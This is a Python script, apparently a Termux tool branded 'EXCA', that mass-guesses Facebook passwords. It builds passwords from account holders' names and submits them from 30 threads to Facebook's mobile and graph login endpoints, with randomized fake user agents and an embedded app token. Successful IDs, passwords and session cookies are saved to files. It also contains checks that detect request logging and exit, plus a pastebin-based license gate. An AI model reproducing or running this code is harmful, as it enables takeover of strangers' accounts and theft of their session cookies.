import os, sys
from os import system as sm
from sys import platform as pf
import time
from time import sleep as sp
import random
import re
import httpx
import asyncio
import json
#sm('apt install espeak -y')
try:
    import requests, bs4, concurrent.futures, uuid, string, rich
    from rich import print as rprint
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as bsoup
    from uuid import uuid4 as uid4
except ModuleNotFoundError:
    print("Installing Missing Modules")
    sm("pip install requests bs4 futures")
#colors
r="[bold red]"
g="[bold green]"
b="[bold blue]"
y="[bold yellow]"
m="[bold magenta]"
c="[bold cyan]"
w="[bold white]"
async def bypass():
  file = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py','r')
  file2 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py','r')
  file3 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r')
  data = file.read()
  sess = file2.read()
  approve = file3.read()
  keyword =("print(url)")
  keyword2 = ("print(data)")
  if keyword in data or "echo" in data or "pprint" in data:
    sm('clear')
    print(10*"\n\033[1;31mBOBO BYPASS PA")
    print("\n\033[1;33mBYE BYE FILES AHAHAHHAHA")
    exit()
  elif "https://pastebin.com/raw/zg0D9N7Y" in approve or "DR4X" in approve or "pprint" in approve:
    print(10*"Trying hard bypassing my tool lol🤣🤣🤣🤣\n")
    exit()
  elif keyword in sess or "echo" in sess or keyword2 in sess or "pprint" in sess or "print(headers)" in sess or "Console" in sess or "{data}" in sess or "{url}" in sess or "{headers}" in sess:
    sm('clear')
    print(20*"\nCAPTURE DATA PA HAHAHAHAHA")
    print("\n\033[1;31mBYE BYE FILES")
    exit()
  else:
    #os.system('clear')
    #xc=requests.get("https://pastebin.com/raw/hnHX2J8B").text
    #open(".user.txt",'w').write(xc)
    #xx=open(".user.txt",'r').readlines()
    #rprint("[bold green]CHECKING TOTAL USERS[/]")
    #sp(5)
    #rprint(f"[bold green]Total User: [bold cyan]{len(xx)}[/]")
    #sp(4)
    #if len(xx) > 25:
      #rprint("[bold red]ONLY 5 USERS CAN USE THIS TOOL[/]")
      #exit()
    #else:
      await main()
#logo
def clear():
    if pf in ['win32','win64']:
        sm('cls')
    else:
        sm('clear')
#ua
mod=[]
ua=[]
xxxx=open('dev.json','r').read()
bnb=json.loads(xxxx)
#bnb=httpx.get("https://raw.githubusercontent.com/pbakondy/android-device-list/master/devices.json").json()
for bnbm in bnb:
  mod.append(bnbm['model'])
    #if "GT-" in bnbm['model'] or "RMX" in bnbm['model'] or "OPPO" in bnbm['model'] or "SM-" in bnbm['model'] or "CPH" in bnbm['model'] or "LG" in bnbm['model'] or "M200" in bnbm['model'] or "vivo" in bnbm['model'] or "Lenovo" in bnbm['model'] or "motorola" in bnbm['model'] or 'SAMSUNG' in bnbm['model'] or "SAMSUNG" in bnbm['model'] or "ASUS" in bnbm['model'] or "MI " in bnbm['model'] or "Infinix" in bnbm['model'] or "HUAWEI" in bnbm['model'] or "Redmi" in bnbm['model'] or "ZTE" in bnbm['model']:
for agent in range(90000,99999):
    model=random.choice(mod)
    fff=f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
    qp1a=(f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(0,9)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}.{random.randint(100000,210000)}.0{random.randint(10,35)}")
    iab=f"[FB_IAB/{random.choice(['FB4A','MESSENGER','Orca-Android','MessengerLite'])};FBAV/{random.randint(80,400)}.0.0.{random.randint(10,25)}.{random.randint(100,300)};]"
    fban=f"[FBAN/EMA;FBLC/en_US;FBAV/{random.randint(80,400)}.0.0.{random.randint(10,30)}.{random.randint(100,200)};]"
    firef=f"Firefox/{random.randint(70,120)}{random.choice(['.0','.0','.1','.2','.3','.1.1','.1.2','.1.0','.1.1','.1.3','.1.4','.2.0','.2.1','.2.2','.2.3','.3.0','.3.1','.3.2','.3.3','.4.0'])}"
    ranb=random.choice([qp1a])
    las=random.choice([iab,fban,firef])
    firefox=f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {model} Build/{ranb}) Gecko/114.0 {firef}"
    moz=f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {model} Build/{ranb}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36 {las}"
    kiwi=f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {model} Build/{ranb}) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/{random.randint(90,117)}.0.{random.randint(4000,6000)}.{random.randint(30,150)} Mobile Safari/537.36"
    ran=random.choice([moz,kiwi,firefox])
    ua.append(ran)
def joined(ids):
    if len(ids)==15:
        if ids[:10] in ['1000000000']:creation = '[bold yellow]2009'
        elif ids[:9] in ['100000000']:creation = '[bold yellow]2009'
        elif ids[:8] in ['10000000']:creation = '[bold yellow]2009'
        elif ids[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '[bold yellow]2009'
        elif ids[:7] in ['1000006','1000007','1000008','1000009']:creation = '[bold yellow]2010'
        elif ids[:6] in ['100001']:creation = '[bold yellow]2010[bold white]/[bold yellow]2011'
        elif ids[:6] in ['100002','100003']:creation = '[bold yellow]2011[bold white]/[bold yellow]2012'
        elif ids[:6] in ['100004']:creation = '[bold yellow]2012[bold white]/[bold yellow]2013'
        elif ids[:6] in ['100005','100006']:creation = '[bold yellow]2013[bold white]/[bold yellow]2014'
        elif ids[:6] in ['100007','100008']:creation = '[bold yellow]2014/2015[/]'
        elif ids[:6] in ['100009']:creation = '[bold yellow]2015'
        elif ids[:5] in ['10001']:creation = '[bold yellow]2015[bold white]/[bold yellow]2016'
        elif ids[:5] in ['10002']:creation = '[bold yellow]2016[bold white]/[bold yellow]2017'
        elif ids[:5] in ['10003']:creation = '[bold yellow]2018[bold white]/[bold yellow]2019'
        elif ids[:5] in ['10004']:creation = '[bold yellow]2019[bold white]/[bold yellow]2020'
        elif ids[:5] in ['10005']:creation = '[bold yellow]2020'
        elif ids[:5] in ['10006','10007']:creation = '[bold yellow]2021'
        elif ids[:5] in ['10008']:creation = '[bold yellow]2022'
        else:creation='[bold yellow]2023'
    elif len(ids) in [9,10]:creation = '[bold yellow]2008/2009'
    elif len(ids)==8:creation = '[bold yellow]2007/2008'
    elif len(ids)==7:creation = '[bold yellow]2006/2007'
    else:creation='[bold yellow]2023'
    return creation
def logo():
    rprint("""

              {}███████╗{}██╗  ██╗{} █████╗ {} █████╗
              {}██╔════╝{}╚██╗██╔╝{}██╔══██╗{}██╔══██╗
              {}█████╗{}   ╚███╔╝ {}██║  ╚═╝{}███████║
              {}██╔══╝{}   ██╔██╗ {}██║  ██╗{}██╔══██║
              {}███████╗{}██╔╝╚██╗{}╚█████╔╝{}██║  ██║
              {}╚══════╝{}╚═╝  ╚═╝{} ╚════╝ {}╚═╝  ╚═╝
{}
                     [bold red]Develop By [bold cyan]GEO
{}[/]""".format(r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,r,g,b,y,"[bold cyan]="*os.get_terminal_size().columns,"[bold cyan]="*os.get_terminal_size().columns))
def lines():
    rprint("[bold cyan]="*os.get_terminal_size().columns)
async def login():
  check=requests.get("https://pastebin.com/raw/Nr9LuZ4u").text
  clear()
  logo()
  login=input("\033[1;36mEnter Your Username: \033[1;31m")
  if login == "mrdeath":
    await main()
  elif login in check:
    await bypass()
  else:
    sys.exit()
loop=0
oks=[]
cps=[]
def main():
    try:
        clear()
        logo()
        rprint(" {}[{}1{}] {}File Cloning\n {}[{}2{}]{} Exit".format(m,c,m,g,m,c,m,r))
        lines()
        xx=input(" \033[1;36mChoose Number: \033[1;37m")
        if xx == "1":
            clear()
            logo()
            fi=input("\033[1;36m Enter Your File: \033[1;37m")
            try:
                fi2=open(fi,'r').read().splitlines()
            except FileNotFoundError:
                rprint("{}File Not Found".format(r))
                sp(3)
                main()
            clear()
            logo()
            rprint(" {}Choose Method\n\n {}[{}1{}]{} Method 1 {}({}Doesn't Consume Much GB{})\n {}[{}2{}]{} Method 2{} ({}FAST{})[/]".format(y,m,c,m,y,c,g,c,m,c,m,y,c,g,c))
            lines()
            meth=input("\033[1;32m Choose Method: \033[1;36m")
            lines()
            passw=[]
            try:
                pas_limit=int(input("{}How Many Passwords:".format("\033[1;32m")));lines()
            except ValueError:
                pas_limit=1
            for i in range(pas_limit):
                x=input(f"Enter Password {i+1}: ")
                passw.append(x)
            with tred(max_workers=30) as exca_sub:
                clear()
                logo()
                print(f" \033[1;32mTotal IDS:\033[1;36m {len(fi2)}\n \033[1;32mPasswords:\033[1;32m {len(passw)}")
                lines()
                print(" \033[1;32mOK IDS SAVE IN\n/sdcard/exca-ok.txt")
                lines()
                for user in fi2:
                    ids,names=user.split("|")
                    passlist=passw
                    if meth in ['1','01']:
                        exca_sub.submit(m1,ids,names,passlist)
                    elif meth in ['2','02']:
                        exca_sub.submit(m2,ids,names,passlist)
                    else:
                        exit()
            lines()
            rprint("{} Cracking Is Finish".format(g))
            lines()
            rprint("{} OK IDS/{}".format(g,len(oks)))
        else:
            rprint(" [bold red]QUITTING[/]")
            sp(5)
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
def m1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write("\r\r\033[1;36m EXCA\033[1;35m(\033[1;37m%s\033[1;35m) \033[1;32mOK•%s \033[1;31mCP•%s"%(loop,len(oks),len(cps)));sys.stdout.flush()
    session=requests.Session()
    try:
        first = names.split(" ")[0]
        try:
            last = names.split(" ")[1]
        except:
            last = "Exca"
        fs=first.lower()
        las=last.lower()
        for pass2 in passlist:
            pas = pass2.replace('First',first).replace("Last",last).replace("first",fs).replace("last",las)
            ccc=random.choice(ua)
            headers={
                    'authority': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dpr': '3',
                    'origin': 'https://m.facebook.com',
                    'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
                    'sec-ch-ua-mobile': '?1',
                    #'sec-ch-ua-model': f'"{modelsss}"',
                    'sec-ch-ua-platform': f'"Android"',
                    #'sec-ch-ua-platform-version': f'"{random.randint(4,13)}{random.choice(["",".0.0",".0",".1.2",".0.1","","","",".0.2"])}"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': ccc,
                    'viewport-width': '980',
                    }
            getlog=session.get(f"https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr")
            data={
                    "lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),
                    "uid":ids,
                    "next":"https://free.facebook.com/login/save-device/",
                    "flow":"login_no_pin",
                    "pass":pas,
                }
            comp = session.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0",headers=headers,data=data)
            exc=session.cookies.get_dict().keys()
            cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            if "c_user" in exc:
                rprint(" [bold green]\n[OK] USERID: [bold cyan]%s\n[bold green] PASS: [bold cyan]%s\n [bold green]DATE: %s\n [bold green]COOKIES: [bold cyan]%s[/]"%(ids,pas,joined(ids),cookie))
                oks.append(ids)
                open("/sdcard/exc-ok.txt","a").write(ids+" >> "+pas+" >> "+cookie)
                break
            elif "checkpoint" in exc:
                cps.append(ids)
                break
            else:
                continue
    except requests.exception.ConnectionError:
        sp(10)
    loop+=1
def m2(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write("\r\r\033[1;36m EXCA\033[1;35m(\033[1;37m%s\033[1;35m) \033[1;32mOK•%s \033[1;31mCP•%s"%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
              'device_id': f'{uuid.uuid4()}', 
              'cpl': 'true', 
              'family_device_id': f'{uuid.uuid4()}', 
              'credentials_type': 'device_based_login_password', 
              'error_detail_type': 'button_with_disabled', 
              'source': 'device_based_login', 
              'email': ids, 
              'password': pas, 
              'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
              'generate_session_cookies': '1', 
              'meta_inf_fbmeta': '', 
              'advertiser_id': f'{uuid.uuid4()}', 
              'currently_logged_in_userid': '0', 
              'locale': 'en_US', 
              'client_country_code': '', 
              'method': 'auth.login', 
              'fb_api_req_friendly_name': 'authenticate', 
              'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
              'api_key': f'62f8ce9f74b12f84c123cc23437a4a32'
              
            }
            build=f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(10,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
            fbbb = random.randint(200000000,300000000)
            fbob = random.randint(200000000,300000000)
            qp1a = f"QP1A.{random.randint(100000,200000)}.0{random.randint(10,25)}"
            fbpnnn=random.choice(['FB4A','Orca-Android','MessengerLite'])
            if fbpnnn == "FB4A":
              fbpnn="katana"
            elif fbpnnn == "Orca-Android":
              fbpnn="orca"
            elif fbpnnn == "MessengerLite":
              fbpnn="mlite"
            builld = random.choice([build,qp1a])
            fbccr=random.choice(['GLOBE','TM','TNT','SMART'])
            headers={
                    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,80000000)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=1.5,width=540,height=888};FBLC/en_US;FBCR/Telennor;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.%s;FBDV/MotoE2(4G-LTE);FBSV/5;FBOP/1;FBCA/arm64-v7a:]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/ZONG;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/SM-G531F;FBSV/5;FBOP/1;FBCA/arm64-v7a:]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Telennor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.%s;FBDV/SM-A300FU;FBSV/5;FBOP/1;FBCA/arm64-v7a:]"%(fbpnn),
              'Content-Type': 'application/x-www-form-urlencoded', 
              'Host': 'graph.facebook.com', 
              'X-FB-Net-HNI': str(random.randint(10000,99999)), 
              'X-FB-SIM-HNI': str(random.randint(10000,99999)), 
              'X-FB-Connection-Type': 'MOBILE.LTE',
              'X-Tigon-Is-Retry': 'False',
              'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 
              'x-fb-device-group': str(random.randint(1000,9999)),
              'X-FB-Friendly-Name': 'ViewerReactionsMutation',  
              'X-FB-Request-Analytics-Tags': 'graphservice', 
              'X-FB-HTTP-Engine': 'Liger', 
              'X-FB-Client-IP': 'True', 
              'X-FB-Server-Cluster': 'True', 
              'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
              
            }
            url='https://b-graph.facebook.com/auth/login'
            req=requests.post(url,data=data,headers=headers).json()
            if 'session_key' in req:
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print('\r\r \033[1;32m[OK] '+ids+'|'+pas)
                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                open('/sdcard/DRAX-COOKIES.txt','a').write(ids+"|"+pas+" | "+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                #print('\r\r\033[1;31m [CP] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
ah="xD4RK-"
imt="-M4786=="
ak=" DR4X-"
myid=uuid.uuid4().hex[:10].upper()

try:
  key1=open('/data/data/com.termux/files/usr/bin/.exca.txt', 'r').read()
except:
  kok=open('/data/data/com.termux/files/usr/bin/.exca.txt', 'w')
  kok.write(myid+imt)
  kok.close()
async def key():
  #r1=str(urlopen("https://pastebin.com/raw/zg0D9N7Y").read())
  key1=open('/data/data/com.termux/files/usr/bin/.exca.txt', 'r').read()
  clear()
  logo()
  async with aiohttp.ClientSession() as sess:
    async with sess.get('https://pastebin.com/raw/hnHX2J8B') as appro:
      r1 = await appro.text()
      if key1 in r1:
        os.system('clear')
        rprint("{}Your Key Is Approved[/]".format(g))
        sp(3)
        main()
      else:
        os.system("clear")
        print("\t \033[1;32m First Get Approval\033[1;37m ")
        time.sleep(5)
        os.system("clear")
        logo()
        print ("")
        print(" YOU HAVE TO GET APPROVE FIRST BEFORE USING IT")
        print ("")
        print(" Your Key is Not Approved ")
        print("")
        print (" Your Key : "+ak+ah+key1 )
        print ("")
        input(" Press Enter To Send Key")
        time.sleep(3.5)
        os.system('xdg-open https://www.messenger.com/t/100065316414713')
#end
#main()
asyncio.run(bypass())
